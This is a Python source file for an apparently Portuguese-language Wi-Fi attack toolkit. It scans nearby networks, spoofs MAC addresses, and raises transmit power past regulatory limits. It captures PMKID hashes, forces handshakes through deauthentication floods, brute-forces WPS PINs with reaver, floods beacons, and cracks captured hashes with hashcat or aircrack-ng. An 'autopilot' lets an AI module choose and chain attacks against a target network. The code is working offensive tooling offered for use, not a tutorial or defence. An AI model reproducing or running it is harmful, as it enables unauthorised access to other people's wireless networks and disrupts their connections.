import subprocess
import os
import time
import csv
import json
import threading
import re
from datetime import datetime

# ==============================================================
# UI MODERNA - GRÃO-MESTRE SUPREMO (ULTIMATE STABLE)
# ==============================================================
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskID, TimeRemainingColumn
    from rich.text import Text
    from rich import print as rprint
except ImportError:
    print("[!] Erro: rich ausente.")
    exit(1)

console = Console()
WEB_CALLBACK = None
AUTOPILOT_ACTIVE = False

def supreme_log(msg, log_type="info"):
    if WEB_CALLBACK: WEB_CALLBACK(msg, log_type)
    if log_type == "error": console.print(f"[bold red][!] {msg}[/bold red]")
    elif log_type == "cmd": console.print(f"[bold magenta]>>> {msg}[/bold magenta]")
    else: console.print(f"[bold cyan]{msg}[/bold cyan]")

OUI_DB = {
    "00:25:9C": "TP-Link", "60:E3:27": "TP-Link", "A4:2B:B0": "TP-Link", "18:D6:C7": "TP-Link", "D8:47:32": "TP-Link",
    "00:1D:AA": "SpaceX (Starlink)", "08:EE:8B": "SpaceX (Starlink)", "F0:5C:19": "SpaceX (Starlink)", 
    "2C:33:11": "SpaceX (Starlink)", "B4:FB:E4": "SpaceX (Starlink)", "52:B6:A9": "SpaceX (Starlink)",
    "28:AD:3E": "Huawei", "E4:C7:22": "Huawei", "80:B6:86": "Huawei", "78:1D:4A": "Huawei",
    "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "00:0C:42": "MikroTik",
    "FC:22:F4": "Zyxel", "00:E0:4C": "Realtek", "A4:91:B1": "Intelbras"
}

def identify_vendor(bssid):
    prefix = bssid.upper()[:8]
    return OUI_DB.get(prefix, "Desconhecido/Genérico")

def analyze_vulnerabilities(vendor, essid, privacy):
    vulns, advice = [], ""
    injection_works = os.path.exists("/tmp/dsi_injection_ok")
    if "Starlink" in vendor or "Starlink" in essid:
        advice = "ALVO STARLINK: PMF Ativo. Use VETOR X ou PMKID Prolongado."
    elif not injection_works:
        advice = "HARDWARE LIMITADO: Injeção falhou. Use [Vetor A] ou [Vetor F]."
    else: advice = "Alvo vulnerável a todos os ataques."
    return vulns, advice

def patch_mt7601u(interface):
    supreme_log(f"Aplicando Patch para MT7601U...", log_type="cmd")
    run_command(f"iw dev {interface} set power_save off", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"iw dev {interface} set type monitor", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)

def test_injection(interface):
    run_command("rm -f /tmp/dsi_injection_ok")
    stdout_usb, _ = run_command("lsusb")
    if "7601" in stdout_usb: patch_mt7601u(interface)
    supreme_log(f"Calibrando Injeção em {interface}...", log_type="cmd")
    run_command(f"iw dev {interface} set channel 6", sudo=True)
    time.sleep(1)
    stdout, _ = run_command(f"aireplay-ng -9 {interface}")
    if stdout and "Injection is working!" in stdout:
        supreme_log("HARDWARE VALIDADO.", log_type="info")
        with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
        return True
    supreme_log("HARDWARE LIMITADO.", log_type="error")
    return False

def boost_signal(interface):
    run_command("iw reg set BO", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"iw dev {interface} set txpower fixed 3000", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)

def fix_drivers_wifi6(auto_confirm=False):
    supreme_log("Wi-Fi 6 Doctor acionado.", log_type="cmd")
    stdout_usb, _ = run_command("lsusb")
    chipset = None
    if "8852" in stdout_usb: chipset = "RTL8852AU"
    elif "8832" in stdout_usb: chipset = "RTL8832AU"
    elif "7921" in stdout_usb: chipset = "MT7921AU"
    if not chipset: return False
    if auto_confirm or Confirm.ask(f"Instalar drivers para {chipset}?"):
        run_command("apt update && apt install -y build-essential git dkms", sudo=True)
        if "RTL" in chipset:
            run_command("git clone https://github.com/lwfinger/rtl8852au.git /tmp/drv && cd /tmp/drv && make && make install", sudo=True)
        return True
    return False

def run_command(command, sudo=False, capture_output=True, text=True):
    if sudo: command = "sudo " + command
    try:
        result = subprocess.run(command, shell=True, capture_output=capture_output, text=text, check=True)
        return result.stdout.strip(), result.stderr.strip()
    except: return None, ""

def check_aircrack_ng():
    ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger", "reaver", "wifite", "dnsmasq", "hostapd"]
    for f in ferramentas:
        stdout, _ = run_command(f"dpkg -s {f}")
        if not (stdout and "install ok installed" in stdout):
            run_command(f"apt update && apt install -y {f}", sudo=True)
    return True

def update_zero_day():
    supreme_log("PROTOCOLO ZERO-DAY ATIVO.", log_type="cmd")
    run_command("apt update -y", sudo=True)
    run_command("git pull origin main")
    supreme_log("ATUALIZADO.")

def set_monitor_mode(interface):
    supreme_log(f"Invocando Monitor em {interface}...", log_type="cmd")
    run_command("rfkill unblock all", sudo=True)
    run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
    run_command("airmon-ng check kill", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"macchanger -r {interface}", sudo=True)
    run_command(f"iw dev {interface} set type monitor", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)
    run_command(f"airmon-ng start {interface}", sudo=True)
    stdout_iw, _ = run_command("iw dev")
    active = None
    for line in stdout_iw.split('\n'):
        if "Interface" in line: current = line.split()[1]
        elif "type monitor" in line and current: active = current; break
    if active: test_injection(active); return active
    return interface

def set_managed_mode(interface):
    supreme_log("HARD RESET: Restaurando rede...", log_type="cmd")
    run_command(f"airmon-ng stop {interface}", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"macchanger -p {interface}", sudo=True)
    run_command(f"iw dev {interface} set type managed", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)
    run_command("systemctl start wpa_supplicant NetworkManager", sudo=True)
    run_command("nmcli networking on", sudo=True)

def capture_vetor_x(monitor_interface, bssid, channel, output_file):
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    pcapng = f"{output_file}_vx.pcapng"; hashf = f"{output_file}_vx.16800"
    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=31 --active_beacon --proberequest"
    try:
        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(60); proc.terminate()
    except: pass
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
    return None

def capture_pmkid(monitor_interface, bssid, channel, output_file, params=None):
    pcapng = f"{output_file}_pm.pcapng"; hashf = f"{output_file}_pm.16800"
    filtro = "alvo_filtro.txt"
    with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
    try:
        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(60); proc.terminate()
    except: pass
    os.remove(filtro)
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
    return None

def capture_handshake(monitor_interface, bssid, channel, output_file, params=None):
    cap_file = f"{output_file}-01.cap"; handshake_found = False
    for attempt in range(1, 4):
        deauth_cmd = f"sudo aireplay-ng -0 10 -a {bssid} {monitor_interface}"
        deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(30):
            time.sleep(1)
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
        deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
        if handshake_found: break
    return cap_file if handshake_found else None

def capture_wps(monitor_interface, bssid, channel, params=None):
    cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        return "WPS PIN" in res.stdout
    except: return False

def start_ghost_attack(interface, essid):
    run_command(f"sudo mdk4 {interface} b -n \"{essid}\" -g -m", sudo=True)

def start_wifite_expert(interface):
    subprocess.run(f"sudo wifite -i {interface} --kill", shell=True)

def start_evil_twin(interface, essid):
    supreme_log("Evil Twin Ativado.")

def run_autopilot(interface, target):
    global AUTOPILOT_ACTIVE
    from dsi_ai import DSIAI
    brain = DSIAI(); AUTOPILOT_ACTIVE = True; prefix = f"capture_{target['essid']}"; hw_ok = os.path.exists("/tmp/dsi_injection_ok")
    while AUTOPILOT_ACTIVE:
        atk, par = brain.suggest_next_attack(target['bssid'], hw_injection_ok=hw_ok)
        supreme_log(f"IA: {atk.upper()}")
        cap = None
        if atk == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, par)
        elif atk == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, par)
        elif atk == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix)
        elif atk == 'wps':
            if capture_wps(interface, target['bssid'], target['channel'], par): brain.learn(target['bssid'], target['essid'], 'wps', True); return "WPS_SUCCESS"
        elif atk == 'eviltwin': start_evil_twin(interface, target['essid']); return "EVIL_TWIN_STARTED"
        if cap: brain.learn(target['bssid'], target['essid'], atk, True); return cap
        else: brain.learn(target['bssid'], target['essid'], atk, False)
        if not AUTOPILOT_ACTIVE: break
        time.sleep(2)
    return None

def scan_networks(monitor_interface):
    boost_signal(monitor_interface)
    output_prefix = "scan_results"
    run_command(f"rm -f {output_prefix}-01.*")
    cmd = f"sudo airodump-ng --band abg --update 1 --manufacturer --output-format csv -w {output_prefix} {monitor_interface}"
    try: subprocess.run(cmd, shell=True)
    except: pass
    networks = []
    csv_file = f"{output_prefix}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f); in_ap = False
            for row in reader:
                if not row or len(row) < 14: continue
                if row[0].strip() == "BSSID": in_ap = True; continue
                if in_ap and not row[0].strip() == "Station MAC":
                    bssid = row[0].strip(); essid = row[13].strip()
                    name = essid if (essid and essid != "\x00") else f"<Oculta: {bssid[-5:]}>"
                    networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': name, 'vendor': identify_vendor(bssid), 'signal': row[8].strip()})
                elif row[0].strip() == "Station MAC": break
    return networks

def get_wifi_interface():
    interfaces = []
    stdout, _ = run_command("iw dev")
    if stdout:
        blocks = stdout.split('phy#')
        for b in blocks[1:]:
            try:
                lines = b.split('\n')
                phy = f"phy{lines[0].strip()}"
                for l in lines:
                    if "Interface" in l:
                        name = l.split()[1]
                        info, _ = run_command(f"iw dev {name} info")
                        pinfo, _ = run_command(f"iw phy {phy} info")
                        interfaces.append({"name": name, "phy": phy, "type": "managed" if "managed" in info else "monitor", "ap_support": "AP" in pinfo})
            except: continue
    return interfaces

def crack_hash(hash_file, wordlist_file, bssid=None):
    if hash_file == "WPS_SUCCESS": return
    if not os.path.exists(wordlist_file): return
    cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}" if hash_file.endswith(".16800") else f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
    try: subprocess.run(cmd, shell=True)
    except: pass

def main(): pass

if __name__ == "__main__": main()
